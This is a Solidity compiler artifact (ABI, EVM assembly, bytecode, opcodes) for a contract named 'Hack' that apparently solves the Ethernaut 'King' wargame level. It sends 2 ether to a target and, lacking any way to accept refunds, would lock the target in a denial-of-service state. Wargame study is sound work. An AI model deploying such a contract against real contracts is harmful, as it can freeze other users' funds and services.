{
	"ZOpenZep/King.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_king",
							"type": "address"
						}
					],
					"name": "hack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"ZOpenZep/King.sol\":649:867  contract Hack{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ZOpenZep/King.sol\":649:867  contract Hack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c4c174f\n      eq\n      tag_2\n      jumpi\n    tag_1:\n      revert(0x00, 0x00)\n        /* \"ZOpenZep/King.sol\":669:864  function hack(address _king) external payable{... */\n    tag_2:\n      tag_3\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_4\n      swap2\n      swap1\n      tag_5\n      jump\t// in\n    tag_4:\n      tag_6\n      jump\t// in\n    tag_3:\n      stop\n    tag_6:\n        /* \"ZOpenZep/King.sol\":746:753  2 ether */\n      0x1bc16d674ec80000\n        /* \"ZOpenZep/King.sol\":733:742  msg.value */\n      callvalue\n        /* \"ZOpenZep/King.sol\":733:753  msg.value == 2 ether */\n      eq\n        /* \"ZOpenZep/King.sol\":725:769  require(msg.value == 2 ether, \"invalid sum\") */\n      tag_8\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_8:\n        /* \"ZOpenZep/King.sol\":780:792  bool success */\n      0x00\n        /* \"ZOpenZep/King.sol\":798:803  _king */\n      dup2\n        /* \"ZOpenZep/King.sol\":798:808  _king.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ZOpenZep/King.sol\":816:825  msg.value */\n      callvalue\n        /* \"ZOpenZep/King.sol\":798:830  _king.call{value: msg.value}(\"\") */\n      mload(0x40)\n      tag_11\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_15\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_14)\n    tag_15:\n      0x60\n      swap2\n      pop\n    tag_14:\n      pop\n        /* \"ZOpenZep/King.sol\":779:830  (bool success, ) = _king.call{value: msg.value}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"ZOpenZep/King.sol\":848:855  success */\n      dup1\n        /* \"ZOpenZep/King.sol\":840:856  require(success) */\n      tag_16\n      jumpi\n      revert(0x00, 0x00)\n    tag_16:\n        /* \"ZOpenZep/King.sol\":714:864  {... */\n      pop\n        /* \"ZOpenZep/King.sol\":669:864  function hack(address _king) external payable{... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_18:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_20:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_21:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_36\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_20\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_22:\n        /* \"#utility.yul\":641:665   */\n      tag_38\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_21\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_39\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      0x00\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_39:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_23:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_41\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_22\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:1170   */\n    tag_5:\n        /* \"#utility.yul\":900:906   */\n      0x00\n        /* \"#utility.yul\":949:951   */\n      0x20\n        /* \"#utility.yul\":937:946   */\n      dup3\n        /* \"#utility.yul\":928:935   */\n      dup5\n        /* \"#utility.yul\":924:947   */\n      sub\n        /* \"#utility.yul\":920:952   */\n      slt\n        /* \"#utility.yul\":917:1036   */\n      iszero\n      tag_43\n      jumpi\n        /* \"#utility.yul\":955:1034   */\n      tag_44\n      tag_18\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":917:1036   */\n    tag_43:\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1100:1153   */\n      tag_45\n        /* \"#utility.yul\":1145:1152   */\n      dup5\n        /* \"#utility.yul\":1136:1142   */\n      dup3\n        /* \"#utility.yul\":1125:1134   */\n      dup6\n        /* \"#utility.yul\":1121:1143   */\n      add\n        /* \"#utility.yul\":1100:1153   */\n      tag_23\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":1090:1153   */\n      swap2\n      pop\n        /* \"#utility.yul\":1046:1163   */\n      pop\n        /* \"#utility.yul\":841:1170   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1176:1345   */\n    tag_24:\n        /* \"#utility.yul\":1260:1271   */\n      0x00\n        /* \"#utility.yul\":1294:1300   */\n      dup3\n        /* \"#utility.yul\":1289:1292   */\n      dup3\n        /* \"#utility.yul\":1282:1301   */\n      mstore\n        /* \"#utility.yul\":1334:1338   */\n      0x20\n        /* \"#utility.yul\":1329:1332   */\n      dup3\n        /* \"#utility.yul\":1325:1339   */\n      add\n        /* \"#utility.yul\":1310:1339   */\n      swap1\n      pop\n        /* \"#utility.yul\":1176:1345   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1512   */\n    tag_25:\n        /* \"#utility.yul\":1491:1504   */\n      0x696e76616c69642073756d000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1487:1488   */\n      0x00\n        /* \"#utility.yul\":1479:1485   */\n      dup3\n        /* \"#utility.yul\":1475:1489   */\n      add\n        /* \"#utility.yul\":1468:1505   */\n      mstore\n        /* \"#utility.yul\":1351:1512   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1518:1884   */\n    tag_26:\n        /* \"#utility.yul\":1660:1663   */\n      0x00\n        /* \"#utility.yul\":1681:1748   */\n      tag_49\n        /* \"#utility.yul\":1745:1747   */\n      0x0b\n        /* \"#utility.yul\":1740:1743   */\n      dup4\n        /* \"#utility.yul\":1681:1748   */\n      tag_24\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1674:1748   */\n      swap2\n      pop\n        /* \"#utility.yul\":1757:1850   */\n      tag_50\n        /* \"#utility.yul\":1846:1849   */\n      dup3\n        /* \"#utility.yul\":1757:1850   */\n      tag_25\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1875:1877   */\n      0x20\n        /* \"#utility.yul\":1870:1873   */\n      dup3\n        /* \"#utility.yul\":1866:1878   */\n      add\n        /* \"#utility.yul\":1859:1878   */\n      swap1\n      pop\n        /* \"#utility.yul\":1518:1884   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1890:2309   */\n    tag_10:\n        /* \"#utility.yul\":2056:2060   */\n      0x00\n        /* \"#utility.yul\":2094:2096   */\n      0x20\n        /* \"#utility.yul\":2083:2092   */\n      dup3\n        /* \"#utility.yul\":2079:2097   */\n      add\n        /* \"#utility.yul\":2071:2097   */\n      swap1\n      pop\n        /* \"#utility.yul\":2143:2152   */\n      dup2\n        /* \"#utility.yul\":2137:2141   */\n      dup2\n        /* \"#utility.yul\":2133:2153   */\n      sub\n        /* \"#utility.yul\":2129:2130   */\n      0x00\n        /* \"#utility.yul\":2118:2127   */\n      dup4\n        /* \"#utility.yul\":2114:2131   */\n      add\n        /* \"#utility.yul\":2107:2154   */\n      mstore\n        /* \"#utility.yul\":2171:2302   */\n      tag_52\n        /* \"#utility.yul\":2297:2301   */\n      dup2\n        /* \"#utility.yul\":2171:2302   */\n      tag_26\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":2163:2302   */\n      swap1\n      pop\n        /* \"#utility.yul\":1890:2309   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2315:2462   */\n    tag_27:\n        /* \"#utility.yul\":2416:2427   */\n      0x00\n        /* \"#utility.yul\":2453:2456   */\n      dup2\n        /* \"#utility.yul\":2438:2456   */\n      swap1\n      pop\n        /* \"#utility.yul\":2315:2462   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2468:2582   */\n    tag_28:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2588:2986   */\n    tag_29:\n        /* \"#utility.yul\":2747:2750   */\n      0x00\n        /* \"#utility.yul\":2768:2851   */\n      tag_56\n        /* \"#utility.yul\":2849:2850   */\n      0x00\n        /* \"#utility.yul\":2844:2847   */\n      dup4\n        /* \"#utility.yul\":2768:2851   */\n      tag_27\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":2761:2851   */\n      swap2\n      pop\n        /* \"#utility.yul\":2860:2953   */\n      tag_57\n        /* \"#utility.yul\":2949:2952   */\n      dup3\n        /* \"#utility.yul\":2860:2953   */\n      tag_28\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":2978:2979   */\n      0x00\n        /* \"#utility.yul\":2973:2976   */\n      dup3\n        /* \"#utility.yul\":2969:2980   */\n      add\n        /* \"#utility.yul\":2962:2980   */\n      swap1\n      pop\n        /* \"#utility.yul\":2588:2986   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2992:3371   */\n    tag_12:\n        /* \"#utility.yul\":3176:3179   */\n      0x00\n        /* \"#utility.yul\":3198:3345   */\n      tag_59\n        /* \"#utility.yul\":3341:3344   */\n      dup3\n        /* \"#utility.yul\":3198:3345   */\n      tag_29\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":3191:3345   */\n      swap2\n      pop\n        /* \"#utility.yul\":3362:3365   */\n      dup2\n        /* \"#utility.yul\":3355:3365   */\n      swap1\n      pop\n        /* \"#utility.yul\":2992:3371   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122062c8c9200c363e936316e2b836f2ef0df558bb8dcfc7dd4f4ff76c6c9ecf636f64736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f5ffd5b506102748061001c5f395ff3fe60806040526004361061001d575f3560e01c80636c4c174f14610021575b5f5ffd5b61003b6004803603810190610036919061015a565b61003d565b005b671bc16d674ec800003414610087576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161007e906101df565b60405180910390fd5b5f8173ffffffffffffffffffffffffffffffffffffffff16346040516100ac9061022a565b5f6040518083038185875af1925050503d805f81146100e6576040519150601f19603f3d011682016040523d82523d5f602084013e6100eb565b606091505b50509050806100f8575f5ffd5b5050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61012982610100565b9050919050565b6101398161011f565b8114610143575f5ffd5b50565b5f8135905061015481610130565b92915050565b5f6020828403121561016f5761016e6100fc565b5b5f61017c84828501610146565b91505092915050565b5f82825260208201905092915050565b7f696e76616c69642073756d0000000000000000000000000000000000000000005f82015250565b5f6101c9600b83610185565b91506101d482610195565b602082019050919050565b5f6020820190508181035f8301526101f6816101bd565b9050919050565b5f81905092915050565b50565b5f6102155f836101fd565b915061022082610207565b5f82019050919050565b5f6102348261020a565b915081905091905056fea264697066735822122062c8c9200c363e936316e2b836f2ef0df558bb8dcfc7dd4f4ff76c6c9ecf636f64736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x274 DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C4C174F EQ PUSH2 0x21 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x3B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x36 SWAP2 SWAP1 PUSH2 0x15A JUMP JUMPDEST PUSH2 0x3D JUMP JUMPDEST STOP JUMPDEST PUSH8 0x1BC16D674EC80000 CALLVALUE EQ PUSH2 0x87 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7E SWAP1 PUSH2 0x1DF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH2 0xAC SWAP1 PUSH2 0x22A JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0xE6 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xEB JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0xF8 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x129 DUP3 PUSH2 0x100 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x139 DUP2 PUSH2 0x11F JUMP JUMPDEST DUP2 EQ PUSH2 0x143 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x154 DUP2 PUSH2 0x130 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16F JUMPI PUSH2 0x16E PUSH2 0xFC JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x17C DUP5 DUP3 DUP6 ADD PUSH2 0x146 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x696E76616C69642073756D000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x1C9 PUSH1 0xB DUP4 PUSH2 0x185 JUMP JUMPDEST SWAP2 POP PUSH2 0x1D4 DUP3 PUSH2 0x195 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x1F6 DUP2 PUSH2 0x1BD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x215 PUSH0 DUP4 PUSH2 0x1FD JUMP JUMPDEST SWAP2 POP PUSH2 0x220 DUP3 PUSH2 0x207 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x234 DUP3 PUSH2 0x20A JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH3 0xC8C920 0xC CALLDATASIZE RETURNDATACOPY SWAP4 PUSH4 0x16E2B836 CALLCODE 0xEF 0xD CREATE2 PC 0xBB DUP14 0xCF 0xC7 0xDD 0x4F 0x4F 0xF7 PUSH13 0x6C9ECF636F64736F6C63430008 SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "125600",
						"executionCost": "169",
						"totalCost": "125769"
					},
					"external": {
						"hack(address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack(address)": "6c4c174f"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}